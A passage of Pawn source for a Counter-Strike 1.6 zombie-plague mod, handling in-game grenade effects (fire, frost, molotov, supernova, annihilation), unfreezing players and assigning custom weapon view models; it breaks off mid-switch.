	pev(ent, pev_origin, originF)
	
	// Make the explosion
	create_blast2(originF)
	
	// Fire nade explode sound
	//static sound[64]
	//ArrayGetString(grenade_fire, random_num(0, ArraySize(grenade_fire) - 1), sound, charsmax(sound))
	emit_sound(ent, CHAN_WEAPON, gSOUND_GRENADE_FIRE_EXPLODE, 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	// Collisions
	static victim
	victim = -1
	
	while ((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, NADE_EXPLOSION_RADIUS)) != 0)
	{
		// Only effect alive zombies
		if (!is_user_valid_alive(victim) || !g_zombie[victim] || g_nodamage[victim] || gTroll[victim])
			continue;
		
		if (g_nemesis[victim]) // fire duration (nemesis is fire resistant)
			g_burning_duration[victim] += 10
		else
			g_burning_duration[victim] += 35
		
		// Set burning task on victim if not present
		if (!task_exists(victim+TASK_BURN))
			set_task(0.2, "burning_flame", victim+TASK_BURN, _, _, "b")
	}
	
	// Get rid of the grenade
	remove_entity(ent)
}

// Frost Grenade Explosion
frost_explode(ent)
{
	// Get origin
	static Float:originF[3]
	pev(ent, pev_origin, originF)
	
	// Make the explosion
	create_blast3(originF)
	
	// Frost nade explode sound
	//static sound[64]
	//ArrayGetString(grenade_frost, random_num(0, ArraySize(grenade_frost) - 1), sound, charsmax(sound))
	emit_sound(ent, CHAN_WEAPON, gSOUND_GRENADE_FROST_EXPLODE, 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	// Collisions
	static victim
	victim = -1
	
	new id = entity_get_edict(ent, EV_ENT_owner)
	new i_CountFrost = 0;
	
	while ((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, NADE_EXPLOSION_RADIUS)) != 0)
	{
		// Only effect alive unfrozen zombies
		if (!is_user_valid_alive(victim) || !g_zombie[victim] || g_frozen[victim] || g_nodamage[victim])
			continue;
		
		// Nemesis shouldn't be frozen
		if (g_nemesis[victim] || (g_zombieclass[victim] == 12 && g_zombie[victim])/*Tudkym*/ || gTroll[victim])
		{
			// Get player's origin
			static origin2[3]
			get_user_origin(victim, origin2)
			
			// Broken glass sound
			//ArrayGetString(grenade_frost_break, random_num(0, ArraySize(grenade_frost_break) - 1), sound, charsmax(sound))
			emit_sound(victim, CHAN_BODY, gSOUND_FROST_BREAK, 1.0, ATTN_NORM, 0, PITCH_NORM)
			
			// Glass shatter
			message_begin(MSG_PVS, SVC_TEMPENTITY, origin2)
			write_byte(TE_BREAKMODEL) // TE id
			write_coord(origin2[0]) // x
			write_coord(origin2[1]) // y
			write_coord(origin2[2]+24) // z
			write_coord(16) // size x
			write_coord(16) // size y
			write_coord(16) // size z
			write_coord(random_num(-50, 50)) // velocity x
			write_coord(random_num(-50, 50)) // velocity y
			write_coord(25) // velocity z
			write_byte(10) // random velocity
			write_short(g_glassSpr) // model
			write_byte(10) // count
			write_byte(25) // life
			write_byte(BREAK_GLASS) // flags
			message_end()
			
			continue;
		}
		
		i_CountFrost++;
		
		// Light blue glow while frozen
		set_user_rendering(victim, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 25)
		
		// Freeze sound
		//ArrayGetString(grenade_frost_player, random_num(0, ArraySize(grenade_frost_player) - 1), sound, charsmax(sound))
		emit_sound(victim, CHAN_BODY, gSOUND_FROST_PLAYER, 1.0, ATTN_NORM, 0, PITCH_NORM)
		
		// Add a blue tint to their screen
		message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, victim)
		write_short(0) // duration
		write_short(0) // hold time
		write_short(FFADE_STAYOUT) // fade type
		write_byte(0) // red
		write_byte(50) // green
		write_byte(200) // blue
		write_byte(100) // alpha
		message_end()
		
		// Prevent from jumping
		if (pev(victim, pev_flags) & FL_ONGROUND)
			set_user_gravity(victim, 999999.9) // set really high
		else
			set_user_gravity(victim, 0.000001) // no gravity
		
		// Set a task to remove the freeze
		g_frozen[victim] = 1;
		set_task(3.0, "remove_freeze", victim)
	}
	
	if(i_CountFrost >= 10)
	{
		fnUpdateLogros(id, LOGRO_HUMAN, A_DONDE_VAS)
	}
	
	// Get rid of the grenade
	remove_entity(ent)
}

// Remove freeze task
public remove_freeze(id)
{
	// Not alive or not frozen anymore
	if (!g_isalive[id] || !g_frozen[id])
		return;
	
	// Unfreeze
	g_frozen[id] = 0;
	
	// Restore gravity
	if (g_zombie[id])
	{
		if (g_nemesis[id]) set_user_gravity(id, ammount_upgradeF_special_mode(id, HAB_NEMESIS, NEMESIS_GRAVITY, 0.5))
		else set_user_gravity(id, ammount_upgradeF(id, HAB_ZOMBIE, ZOMBIE_GRAVITY, Float:ArrayGetCell(g_zclass_grav, g_zombieclass[id])))
	}
	else
	{
		if (g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gJason[id] || gSniper[id]) 
			set_user_gravity(id, 1.0)
		else if(gWesker[id]) set_user_gravity(id, 0.75)
		else set_user_gravity(id, ammount_upgradeF(id, HAB_HUMAN, HUMAN_GRAVITY, Float:ArrayGetCell(g_hclass_grav, g_humanclass[id])))
	}
	
	// Restore rendering
	// Nemesis or Survivor glow / remove glow
	if (g_nemesis[id]) set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 25)
	else if( g_zombieclass[id] == 11 && g_zombie[id] && !gTroll[id] ) set_user_rendering(id, kRenderFxGlowShell, 0, 255, 0, kRenderNormal, 25) // Leader
	else if (g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id])
		set_user_rendering(id, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 25)
	else set_user_rendering(id)
	
	// Gradually remove screen's blue tint
	message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
	write_short(UNIT_SECOND) // duration
	write_short(0) // hold time
	write_short(FFADE_IN) // fade type
	write_byte(0) // red
	write_byte(50) // green
	write_byte(200) // blue
	write_byte(100) // alpha
	message_end()
	
	// Broken glass sound
	//static sound[64]
	//ArrayGetString(grenade_frost_break, random_num(0, ArraySize(grenade_frost_break) - 1), sound, charsmax(sound))
	emit_sound(id, CHAN_BODY, gSOUND_FROST_BREAK, 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	// Get player's origin
	static origin2[3]
	get_user_origin(id, origin2)
	
	// Glass shatter
	message_begin(MSG_PVS, SVC_TEMPENTITY, origin2)
	write_byte(TE_BREAKMODEL) // TE id
	write_coord(origin2[0]) // x
	write_coord(origin2[1]) // y
	write_coord(origin2[2]+24) // z
	write_coord(16) // size x
	write_coord(16) // size y
	write_coord(16) // size z
	write_coord(random_num(-50, 50)) // velocity x
	write_coord(random_num(-50, 50)) // velocity y
	write_coord(25) // velocity z
	write_byte(10) // random velocity
	write_short(g_glassSpr) // model
	write_byte(10) // count
	write_byte(25) // life
	write_byte(BREAK_GLASS) // flags
	message_end()
	
	//ExecuteForward(g_fwUserUnfrozen, g_fwDummyResult, id);
}

#if defined MOLOTOV_ON
public EffectMolotov(ent)
{
	if(!is_valid_ent(ent))
	{
		remove_task(ent)
		return;
	}
	
	static Float:Origin[3]
	entity_get_vector( ent, EV_VEC_origin, Origin )

	engfunc( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 )
	write_byte( TE_SPRITE )
	engfunc( EngFunc_WriteCoord, Origin[0] )
	engfunc( EngFunc_WriteCoord, Origin[1] )
	engfunc( EngFunc_WriteCoord, Origin[2] )
	write_short( g_molotovSpr )
	write_byte( 2 )
	write_byte( 233 )
	message_end( )
	
	engfunc( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 )
	write_byte( TE_SMOKE )
	engfunc( EngFunc_WriteCoord, Origin[0] )
	engfunc( EngFunc_WriteCoord, Origin[1] )
	engfunc( EngFunc_WriteCoord, Origin[2] - 20.0 )
	write_short( g_smokeSpr )
	write_byte( 6 ) 
	write_byte( 15 )
	message_end( )
	
	/*engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, Origin, 0)
	write_byte(TE_DLIGHT)
	engfunc(EngFunc_WriteCoord, Origin[0])
	engfunc(EngFunc_WriteCoord, Origin[0])
	engfunc(EngFunc_WriteCoord, Origin[0])
	write_byte(25)
	write_byte(255)
	write_byte(128)
	write_byte(0)
	write_byte(2) 
	write_byte(3)
	message_end()*/
}


// Molotov Grenade Explosion
molotov_explode(ent)
{
	new param[6], iOrigin[3];
	new Float:fOrigin[3];
	new owner = pev(ent, pev_owner);
	new ent2 = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, "info_target"));

	pev(ent, pev_origin, fOrigin);

	param[0] = ent;
	param[1] = ent2;
	param[2] = owner;
	param[3] = iOrigin[0] = floatround(fOrigin[0]);
	param[4] = iOrigin[1] = floatround(fOrigin[1]);
	param[5] = iOrigin[2] = floatround(fOrigin[2]);

	emit_sound(ent, CHAN_WEAPON, "molotov/molotov_explosion1.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);

	//if((pev(ent, pev_flags) & FL_ONGROUND))
	random_fire(iOrigin, ent2);
	
	if(is_valid_ent(ent))
		f_radius_damage(owner, fOrigin, 300.0, MOLOTOV_RADIUS, DMG_BLAST);
	
	message_begin( MSG_BROADCAST, SVC_TEMPENTITY )
	write_byte( TE_SPRITE )
	write_coord( floatround( fOrigin[0] ) )
	write_coord( floatround( fOrigin[1] ) )
	write_coord( floatround( fOrigin[2] ) )
	write_short( g_molotovSpr )
	write_byte( 20 )
	write_byte( 233 )
	message_end( )

	new Float:FireTime = 6.0;

	if (++g_Molotov_offset[owner] == 10) 
		g_Molotov_offset[owner] = 0;
	
	set_task(0.2, "fire_damage", 1000 + (10 * (owner - 1)) + g_Molotov_offset[owner], param, 6, "a", floatround(FireTime / 0.2, floatround_floor));
	set_task(1.0, "fire_sound", 1320 + (10 * (owner - 1)) + g_Molotov_offset[owner], param, 6, "a", floatround(FireTime) - 1);
	set_task(FireTime, "fire_stop", 1640 + (10 * (owner - 1)) + g_Molotov_offset[owner], param, 6);
}

public fire_damage(param[]) 
{
	new iOrigin[3], Float:fOrigin[3];
	iOrigin[0] = param[3];
	iOrigin[1] = param[4];
	iOrigin[2] = param[5];

	//if((pev(param[1], pev_flags) & FL_ONGROUND))
	random_fire(iOrigin, param[1]);

	IVecFVec(iOrigin, fOrigin);
	
	if(is_valid_ent(param[0]))
		f_radius_damage(param[2], fOrigin, 47.0, MOLOTOV_RADIUS, DMG_BURN, 0);
}

public fire_sound(param[]) emit_sound(param[1], CHAN_WEAPON, "molotov/molotov_fire.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);

public fire_stop(param[]) 
{
	g_g = 0;

	if (is_valid_ent(param[0])) { remove_entity(param[0]); }
	if (is_valid_ent(param[1])) { remove_entity(param[1]); }

	if ((last_Molotov_ent = (param[0]))) last_Molotov_ent = 0;
}
#endif

// SuperNova Grenade Explosion
supernova_explode(ent)
{
	// Get origin
	static Float:originF[3]
	pev(ent, pev_origin, originF)
	
	// Make the explosion
	engfunc( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0 )
	write_byte( TE_DLIGHT )
	engfunc( EngFunc_WriteCoord, originF[0] )
	engfunc( EngFunc_WriteCoord, originF[1] )
	engfunc( EngFunc_WriteCoord, originF[2] )
	write_byte( 85 )
	write_byte( 0 )
	write_byte( 100 )
	write_byte( 200 )
	write_byte( 150 )
	write_byte( 150 )
	message_end( )
	
	// Frost nade explode sound
	//static sound[64]
	//ArrayGetString(grenade_frost, random_num(0, ArraySize(grenade_frost) - 1), sound, charsmax(sound))
	emit_sound(ent, CHAN_WEAPON, gSOUND_GRENADE_FROST_EXPLODE, 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	// Collisions
	static victim
	victim = -1
	
	new id = entity_get_edict(ent, EV_ENT_owner)
	new i_CountFrost = 0;
	
	while ((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, NADE_EXPLOSION_RADIUS)) != 0)
	{
		// Only effect alive unfrozen zombies
		if (!is_user_valid_alive(victim) || !g_zombie[victim] || g_frozen[victim] || g_nodamage[victim])
			continue;
		
		// Nemesis shouldn't be frozen
		if (g_nemesis[victim] || gTroll[victim])
		{
			// Get player's origin
			static origin2[3]
			get_user_origin(victim, origin2)
			
			// Broken glass sound
			//ArrayGetString(grenade_frost_break, random_num(0, ArraySize(grenade_frost_break) - 1), sound, charsmax(sound))
			emit_sound(victim, CHAN_BODY, gSOUND_FROST_BREAK, 1.0, ATTN_NORM, 0, PITCH_NORM)
			
			// Glass shatter
			message_begin(MSG_PVS, SVC_TEMPENTITY, origin2)
			write_byte(TE_BREAKMODEL) // TE id
			write_coord(origin2[0]) // x
			write_coord(origin2[1]) // y
			write_coord(origin2[2]+24) // z
			write_coord(16) // size x
			write_coord(16) // size y
			write_coord(16) // size z
			write_coord(random_num(-50, 50)) // velocity x
			write_coord(random_num(-50, 50)) // velocity y
			write_coord(25) // velocity z
			write_byte(10) // random velocity
			write_short(g_glassSpr) // model
			write_byte(10) // count
			write_byte(25) // life
			write_byte(BREAK_GLASS) // flags
			message_end()
			
			continue;
		}
		
		i_CountFrost++;
		
		// Light blue glow while frozen
		set_user_rendering(victim, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 25)
		
		// Freeze sound
		//ArrayGetString(grenade_frost_player, random_num(0, ArraySize(grenade_frost_player) - 1), sound, charsmax(sound))
		emit_sound(victim, CHAN_BODY, gSOUND_FROST_PLAYER, 1.0, ATTN_NORM, 0, PITCH_NORM)
		
		// Add a blue tint to their screen
		message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, victim)
		write_short(0) // duration
		write_short(0) // hold time
		write_short(FFADE_STAYOUT) // fade type
		write_byte(0) // red
		write_byte(50) // green
		write_byte(200) // blue
		write_byte(100) // alpha
		message_end()
		
		// Prevent from jumping
		if (pev(victim, pev_flags) & FL_ONGROUND)
			set_user_gravity(victim, 999999.9) // set really high
		else
			set_user_gravity(victim, 0.000001) // no gravity
		
		// Set a task to remove the freeze
		g_frozen[victim] = 2;
		set_task(5.0, "remove_freeze", victim)
	}
	
	if(i_CountFrost >= 10)
	{
		fnUpdateLogros(id, LOGRO_HUMAN, A_DONDE_VAS)
	}
	
	// Get rid of the grenade
	remove_entity(ent)
}

// Aniquilation Grenade Explosion
aniquilation_explode(ent)
{
	// Get origin
	static Float:originF[3]
	pev(ent, pev_origin, originF)
	
	// Smallest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+385.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(255) // green
	write_byte(255) // blue
	write_byte(255) // brightness
	write_byte(0) // speed
	message_end()
	
	// Medium ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+470.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(255) // green
	write_byte(255) // blue
	write_byte(255) // brightness
	write_byte(0) // speed
	message_end()
	
	// Largest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, originF[0]) // x
	engfunc(EngFunc_WriteCoord, originF[1]) // y
	engfunc(EngFunc_WriteCoord, originF[2]) // z
	engfunc(EngFunc_WriteCoord, originF[0]) // x axis
	engfunc(EngFunc_WriteCoord, originF[1]) // y axis
	engfunc(EngFunc_WriteCoord, originF[2]+555.0) // z axis
	write_short(g_exploSpr) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(4) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(0) // red
	write_byte(255) // green
	write_byte(255) // blue
	write_byte(255) // brightness
	write_byte(0) // speed
	message_end()
	
	// Make the explosion
	engfunc( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, originF, 0 )
	write_byte( TE_DLIGHT )
	engfunc( EngFunc_WriteCoord, originF[0] )
	engfunc( EngFunc_WriteCoord, originF[1] )
	engfunc( EngFunc_WriteCoord, originF[2] )
	write_byte( 50 )
	write_byte( 0 )
	write_byte( 255 )
	write_byte( 255 )
	write_byte( 50 )
	write_byte( 80 )
	message_end( )
	
	// Frost nade explode sound
	/*static sound[64]
	ArrayGetString(grenade_frost, random_num(0, ArraySize(grenade_frost) - 1), sound, charsmax(sound))
	emit_sound(ent, CHAN_WEAPON, gSOUND_GRENADE_FROST_EXPLODE, 1.0, ATTN_NORM, 0, PITCH_NORM)*/
	
	// Get attacker
	static attacker
	attacker = pev(ent, pev_owner)
	
	// Collisions
	static victim
	victim = -1
	
	while ((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, NADE_EXPLOSION_RADIUS)) != 0)
	{
		// Only effect alive unfrozen zombies
		if (!is_user_valid_alive(victim) || !g_zombie[victim] || g_nodamage[victim] || gTroll[victim])
			continue;
		
		ExecuteHamB(Ham_Killed, victim, attacker, 0)
	}
	
	// Get rid of the grenade
	remove_entity(ent)
}

// Remove Stuff Task
public remove_stuff()
{
	static ent
	
	// Remove rotating doors
	ent = -1;
	while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "func_door_rotating")) != 0)
		engfunc(EngFunc_SetOrigin, ent, Float:{8192.0 ,8192.0 ,8192.0})
	
	// Remove all doors
	/*if (get_pcvar_num(cvar_removedoors) > 1)
	{
		ent = -1;
		while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "func_door")) != 0)
			engfunc(EngFunc_SetOrigin, ent, Float:{8192.0 ,8192.0 ,8192.0})
	}*/
	
	// Triggered lights
	/*if (!get_pcvar_num(cvar_triggered))
	{
		ent = -1
		while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "light")) != 0)
		{
			dllfunc(DLLFunc_Use, ent, 0); // turn off the light
			set_pev(ent, pev_targetname, 0) // prevent it from being triggered
		}
	}*/
	
	// Force lights off
	/*if(get_pcvar_num(cvar_forcelightsoff))
	{
		// Create own entity to force lights off
		ent = create_entity("light_spot")
		DispatchKeyValue(ent, "_light", "255 255 128 200")
		DispatchSpawn(ent)
		
		ent = create_entity("light_environment")
		DispatchKeyValue(ent, "_light", "255 255 128 200")
		DispatchSpawn(ent)
		
		ent = -1
		while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "light_spot")) != 0)
		{
			DispatchKeyValue(ent, "_light", "255 255 128 %d", get_pcvar_num(cvar_lightsbright))
			DispatchSpawn(ent)
		}
		
		ent = -1
		while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "light_environment")) != 0)
		{
			DispatchKeyValue(ent, "_light", "0 0 0 %d", get_pcvar_num(cvar_lightsbright))
			DispatchSpawn(ent)
		}
	}*/
}

// Set Custom Weapon Models
replace_weapon_models(id, weaponid)
{
	switch (weaponid)
	{
		case CSW_KNIFE: // Custom knife models
		{
			if (g_zombie[id])
			{
				if (g_nemesis[id]) // Nemesis
				{
					if(gHaveBazooka[id] == 2)
					{
						entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/tcs_v_bazooka.mdl" )
						entity_set_string( id, EV_SZ_weaponmodel, "models/zombie_plague/tcs_p_bazooka.mdl" )
					}
					else
					{
						entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/tcs_garras_nem.mdl" )
						entity_set_string( id, EV_SZ_weaponmodel, "" )
					}
				}
				else if( gTroll[id] ) // Troll
				{
					entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/tcs_garras_8.mdl" )
					entity_set_string( id, EV_SZ_weaponmodel, "" )
				}
				else // Zombies
				{
					// Admin knife models?
					static clawmodel[100]
					ArrayGetString(g_zclass_clawmodel, g_zombieclass[id], clawmodel, charsmax(clawmodel))
					format(clawmodel, charsmax(clawmodel), "models/zombie_plague/%s", clawmodel)
					entity_set_string( id, EV_SZ_viewmodel, clawmodel )
					entity_set_string( id, EV_SZ_weaponmodel, "" )
				}
			}
			else // Humans
			{
				if( gJason[id] )
				{
					entity_set_string( id, EV_SZ_viewmodel, gCHAINSAW_V )
					entity_set_string( id, EV_SZ_weaponmodel, gCHAINSAW_P )
				}
				else
				{
					entity_set_string( id, EV_SZ_viewmodel, "models/v_knife.mdl" )
					entity_set_string( id, EV_SZ_weaponmodel, "models/p_knife.mdl" )
				}
			}
		}
		case CSW_M3:
		{
			if( gWeapon[id][ARMA_PRIMARIA][M3] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_m3_1/v_tcs_m3_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_m3_1/p_tcs_m3_1.mdl" )
			}
			else if( gWeapon[id][ARMA_PRIMARIA][M3_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_m3_2/v_tcs_m3_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_m3_2/p_tcs_m3_2.mdl" )
			}
		}
		case CSW_MP5NAVY:
		{
			if( gWeapon[id][ARMA_PRIMARIA][MP5_NAVY] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_mp5navy_1/v_tcs_mp5navy_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_mp5navy_1/p_tcs_mp5navy_1.mdl" )
			}
			else if( gWeapon[id][ARMA_PRIMARIA][MP5_NAVY_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_mp5navy_2/v_tcs_mp5navy_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_mp5navy_2/p_tcs_mp5navy_2.mdl" )
			}
		}
		case CSW_M4A1:
		{
			if( gWeapon[id][ARMA_PRIMARIA][COLT] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_colt_1/v_tcs_colt_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_colt_1/p_tcs_colt_1.mdl" )
			}
			else if( gWeapon[id][ARMA_PRIMARIA][COLT_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_colt_2/v_tcs_colt_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_colt_2/p_tcs_colt_2.mdl" )
			}
		}
		case CSW_AK47:
		{
			if( gWeapon[id][ARMA_PRIMARIA][AK47] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_ak47_2/v_tcs_ak47_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_ak47_2/p_tcs_ak47_2.mdl" )
			}
			else if( gWeapon[id][ARMA_PRIMARIA][AK47_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_ak47_2/v_tcs_ak47_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_ak47_2/p_tcs_ak47_2.mdl" )
			}
		}
		case CSW_TMP:
		{
			if( gWeapon[id][ARMA_PRIMARIA][TMP] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_tmp_1/v_tcs_tmp_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_tmp_1/p_tcs_tmp_1.mdl" )
			}
		}
		case CSW_AUG:
		{
			if( gWeapon[id][ARMA_PRIMARIA][AUG] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_aug_1/v_tcs_aug_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_aug_1/p_tcs_aug_1.mdl" )
			}
		}
		case CSW_SG550:
		{
			if( gWeapon[id][ARMA_PRIMARIA][SG550] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_sg550_1/v_tcs_sg550_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_sg550_1/p_tcs_sg550_1.mdl" )
			}
		}
		case CSW_XM1014:
		{
			if( gWeapon[id][ARMA_PRIMARIA][XM1014] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_xm1014_1/v_tcs_xm1014_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_xm1014_1/p_tcs_xm1014_1.mdl" )
			}
		}
		case CSW_M249:
		{
			if( gWeapon[id][ARMA_PRIMARIA][M249] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_m249_1/v_tcs_m249_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_m249_1/p_tcs_m249_1.mdl" )
			}
		}
		case CSW_GLOCK18:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][GLOCK] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_glock_1/v_tcs_glock_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_glock_1/p_tcs_glock_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][GLOCK_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_glock_2/v_tcs_glock_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_glock_2/p_tcs_glock_2.mdl" )
			}
		}
		case CSW_USP:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][USP] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_usp_1/v_tcs_usp_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_usp_1/p_tcs_usp_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][USP_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_usp_2/v_tcs_usp_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_usp_2/p_tcs_usp_2.mdl" )
			}
		}
		/*case CSW_P228:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][P228] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_p228_1/v_tcs_p228_1.mdl" )
				entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_p228_1/p_tcs_p228_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][P228_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_p228_2/v_tcs_p228_2.mdl" )
				entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_p228_2/p_tcs_p228_2.mdl" )
			}
		}*/
		case CSW_FIVESEVEN:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][FIVESEVEN] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_fiveseven_1/v_tcs_fiveseven_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_fiveseven_1/p_tcs_fiveseven_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][FIVESEVEN_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_fiveseven_1/v_tcs_fiveseven_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_fiveseven_1/p_tcs_fiveseven_1.mdl" )
			}
		}
		/*case CSW_ELITE:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][ELITE] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_elite_1/v_tcs_elite_1.mdl" )
				entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_elite_1/p_tcs_elite_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][ELITE_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_elite_2/v_tcs_elite_2.mdl" )
				entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_elite_2/p_tcs_elite_2.mdl" )
			}
		}*/
		case CSW_DEAGLE:
		{
			if( gWeapon[id][ARMA_SECUNDARIA][DEAGLE] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_deagle_1/v_tcs_deagle_1.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_deagle_1/p_tcs_deagle_1.mdl" )
			}
			else if( gWeapon[id][ARMA_SECUNDARIA][DEAGLE_2] == 1 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/tcs_deagle_2/v_tcs_deagle_2.mdl" )
				//entity_set_string( id, EV_SZ_weaponmodel, "models/tcs_deagle_2/p_tcs_deagle_2.mdl" )
			}
		}
		case CSW_HEGRENADE: // Infection bomb or fire grenade
		{
			if (g_zombie[id]) entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/v_grenade_infect.mdl" )
			#if defined MOLOTOV_ON
